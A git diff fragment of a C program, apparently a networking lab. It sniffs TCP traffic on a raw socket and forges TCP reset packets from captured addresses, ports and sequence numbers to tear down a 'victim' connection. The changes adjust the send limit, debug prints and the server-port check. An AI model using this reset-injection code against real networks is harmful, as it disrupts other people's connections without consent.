@@ -119,24 +119,9 @@ int main(int argc, char *argv[]){
 	socket_address.sll_ifindex = if_idx.ifr_ifindex;
 	socket_address.sll_halen = ETH_ALEN;
 
-	 while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0 && num_envios < 10){
-//	while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0){
-
-		// if(buffer_in[12] == 0x08 && buffer_in[13] == 0x00) {
-		// 	for(i=6;i<12;i++) {
-		// 		mac_dst[i-6] = buffer_in[i];
-		// 	}
+	 while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0 && num_envios <= 2){
 			ip_prot = buffer_in[IP_OFFSET+9];
-			// for (i = IP_OFFSET+12; i < IP_OFFSET+16; i++){
-			// 	ip_dst[i-(IP_OFFSET+12)] = buffer_in[i];
-			// }
-			// for (i = IP_OFFSET+16; i < IP_OFFSET+20; i++) {
-			// 	ip_src[i-(IP_OFFSET+16)] = buffer_in[i];
-			// }
-			// port_src = buffer_in[TCP_OFFSET]<<8 | buffer_in[TCP_OFFSET+1];
-			// port_dst = buffer_in[TCP_OFFSET+2]<<8 | buffer_in[TCP_OFFSET+3];
-			// seq = buffer_in[TCP_OFFSET+4]<<24 | buffer_in[TCP_OFFSET+5]<<16 | buffer_in[TCP_OFFSET+6]<<8 | buffer_in[TCP_OFFSET+7];
-			// ack = buffer_in[TCP_OFFSET+8]<<24 | buffer_in[TCP_OFFSET+9]<<16 | buffer_in[TCP_OFFSET+10]<<8 | buffer_in[TCP_OFFSET+11];
+
 			if( ip_prot == 0x06 ) {		// TCP
 				if(buffer_in[12] == 0x08 && buffer_in[13] == 0x00) {
 					for(i=6;i<12;i++) {
@@ -152,24 +137,24 @@ int main(int argc, char *argv[]){
 				port_dst = buffer_in[TCP_OFFSET+2]<<8 | buffer_in[TCP_OFFSET+3];
 				seq = buffer_in[TCP_OFFSET+4]<<24 | buffer_in[TCP_OFFSET+5]<<16 | buffer_in[TCP_OFFSET+6]<<8 | buffer_in[TCP_OFFSET+7];
 				ack = buffer_in[TCP_OFFSET+8]<<24 | buffer_in[TCP_OFFSET+9]<<16 | buffer_in[TCP_OFFSET+10]<<8 | buffer_in[TCP_OFFSET+11];
-				printf("\nIP HEADER:\n");
-				printf("    IP source: ");
-				for (j=0; j<4; j++){
-					printf("%d ", ip_src[j]);
-				}
-				printf("\n    IP destination: ");
-				for (j=0; j<4; j++) {
-					printf("%d ", ip_dst[j]);
-				}
-				printf("\nTCP HEADER:\n");
-				printf("    PORT source: %04x", port_src);
-				printf("    PORT destination: %04x", port_dst);
-				printf("\n    ACK: %x", ack);
-				printf("\n    SEQ: %x", seq);
-				printf("\n");
+				// printf("\nIP HEADER:\n");
+				// printf("    IP source: ");
+				// for (j=0; j<4; j++){
+				// 	printf("%d ", ip_src[j]);
+				// }
+				// printf("\n    IP destination: ");
+				// for (j=0; j<4; j++) {
+				// 	printf("%d ", ip_dst[j]);
+				// }
+				// printf("\nTCP HEADER:\n");
+				// printf("    PORT source: %04x", port_src);
+				// printf("    PORT destination: %04x", port_dst);
+				// printf("\n    ACK: %x", ack);
+				// printf("\n    SEQ: %x", seq);
+				// printf("\n");
 				// if( port_dst == port_server ) { // Se o destino eh a porta do server, a porta de origem eh a da vitima.
-					// num_envios += 1;
-				if( port_dst == 0x1f40 ) {
+				printf("\n port_dst %x, port_server %d\n", port_dst, port_server);
+				if( port_dst == port_server ) {
 					eh->ether_dhost[0] = mac_dst[0];
 					eh->ether_dhost[1] = mac_dst[1];
 			    eh->ether_dhost[2] = mac_dst[2];
@@ -191,9 +176,6 @@ int main(int argc, char *argv[]){
 					iphdr->ip_off = 0;
 					iphdr->ip_ttl = IPDEFTTL;
 					iphdr->ip_p = IPPROTO_TCP;
-
-					// iphdr->ip_src.s_addr = ip_src[3]<<24 | ip_src[2]<<16 | ip_src[1]<<8 | ip_src[0];
-					// iphdr->ip_dst.s_addr = ip_dst[3]<<24 | ip_dst[2]<<16 | ip_dst[1]<<8 | ip_dst[0];
 					iphdr->ip_src.s_addr = ip_src[3]<<24 | ip_src[2]<<16 | ip_src[1]<<8 | ip_src[0];
 					iphdr->ip_dst.s_addr = ip_dst[3]<<24 | ip_dst[2]<<16 | ip_dst[1]<<8 | ip_dst[0];
 					iphdr->ip_sum = (unsigned short)in_cksum((unsigned short *)iphdr, sizeof(struct ip));
@@ -221,20 +203,19 @@ int main(int argc, char *argv[]){
 							close(fd);
 							exit(1);
 						}
-						printf("Pacote de TCP reset enviado.\n");
-						// memset(packet,0,BUFFER_SIZE);
-						// memset(buffer_in,0,BUFFER_SIZE);
 						port_src = 0;
 						port_dst = 0;
 						ack = 0;
 						seq = 0;
             frame_len = 0;
 						num_envios++;
+						printf("\n Numero Envios %d\n", num_envios);
 					}
 			}
 		}
 		}
 	}
+	printf("\n Out of the loop\n");
 	return 0;
 }
 
